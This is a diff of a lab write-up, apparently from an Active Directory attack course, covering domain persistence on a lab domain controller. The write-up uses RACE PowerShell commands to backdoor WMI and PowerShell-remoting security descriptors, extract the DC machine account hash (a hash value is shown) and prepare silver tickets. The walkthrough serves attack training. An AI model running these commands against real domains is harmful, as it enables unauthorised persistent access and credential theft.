@@ -1,8 +1,8 @@
-# Learning Objective 13
+# Learning Objective 13 (Domain Persistence using ACLs | Security Descriptors)
 
 ## Tasks
 
-1. **Modify security descriptors on `dcorp-dc` to get access using PowerShell remoting and WMI without requiring administrator access**
+1. **Modify security descriptors on `dcorp-dc` to get access using WMI and PowerShell remoting without requiring administrator access**
 2. **Retrieve machine account hash from `dcorp-dc` without using administrator access and use that to execute a silver ticket attack to get code execution with WMI**
 
 ---
@@ -13,7 +13,7 @@
 
 Once we have administrative privileges on a machine, **we can modify security descriptors of services to access the services without administrative privileges**.
 
-Below command (**to be run as domain administrator**, see *Learning Objective 08*) modifies the host security descriptors for WMI on the DC to allow `student422` access to WMI.
+Below command (**to be run as domain administrator**, see *Learning Objective 08*) **modifies the host security descriptors for WMI on the DC to allow `student422` access to WMI**.
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
@@ -121,7 +121,7 @@ Now, we can execute WMI queries on the DC as `student422`.
 [SNIP]
 ```
 
-`gwmi -class win32_operatingsystem -ComputerName dcorp-dc`:
+`Get-WmiObject -class win32_operatingsystem -ComputerName dcorp-dc`:
 ```
 SystemDirectory : C:\Windows\system32
 Organization    :
@@ -130,11 +130,19 @@ RegisteredUser  : Windows User
 SerialNumber    : 00454-30000-00000-AA745
 Version         : 10.0.20348
 ```
+
+`gwmi -class win32_process -ComputerName dcorp-dc`:
+```
+
+```
+
+`gwmi -class antivirusproduct -ComputerName dcorp-dc -namespace 'root\securitycenter2'`:
+```
+
+```
 🚩
 
-Similar modification can be done to **PowerShell remoting configuration**.
-
-In rare cases, you may get an *I/O error* while using the below command, please ignore it. **Please note that this is unstable since some patches in August 2020**.
+Similar modification can be done to **PowerShell remoting configuration** using `Set-RemotePSRemoting` of RACE.
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
@@ -203,6 +211,10 @@ Cached Tickets: (1)
 
 `. C:\AD\Tools\RACE.ps1`
 
+In rare cases, you may get an *I/O error* while using the below command, please ignore it.
+
+**Please note that this is unstable since some patches in August 2020**.
+
 `Set-RemotePSRemoting -SamAccountName student422 -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose`:
 ```
 [dcorp-dc.dollarcorp.moneycorp.local] Processing data from remote server dcorp-dc.dollarcorp.moneycorp.local failed
@@ -213,7 +225,7 @@ request. For more information, see the about_Remote_Troubleshooting Help topic.
 ```
 ❌
 
-Now, we can run commands using PowerShell remoting on the DC without DA privileges.
+Now, **we can run commands using PowerShell remoting on the DC without DA privileges**.
 
 ![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
@@ -230,8 +242,11 @@ student422
 
 2. **Retrieve machine account hash from `dcorp-dc` without using administrator access and use that to execute a silver ticket attack to get code execution with WMI**
 
-To retrieve machine account hash without DA, first we need to modify permissions on the DC.
-Run the below command **as DA**.
+To retrieve machine account hash without DA privileges, first we need to modify permissions on the DC using RACE.
+
+After that we can use `Get-RemoteMachineAccountHash` of RACE.
+
+**Run the below command as DA.**
 
 ![Run as administrator](./assets/screenshots/learning_objectives_run_as_administrator.png)
 
@@ -314,7 +329,7 @@ ComputerName                        BackdoorTrustee
 dcorp-dc.dollarcorp.moneycorp.local student422📌
 ```
 
-Now, we can retrieve hash as `student422`.
+Now, we can retrieve machine hash of the DC as `student422`.
 
 ![dcorp-std422 | student422](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
 
@@ -335,7 +350,7 @@ ComputerName MachineAccountHash
 dcorp-dc🖥️  68d6c096c7cfee52a45d6207489526bc🔑
 ```
 
-We can use the machine account hash to create silver tickets.
+We can use the DC account hash to create silver tickets.
 
 Create silver tickets for **HOST** and **RPCSS** using the machine account hash to execute WMI queries.
 
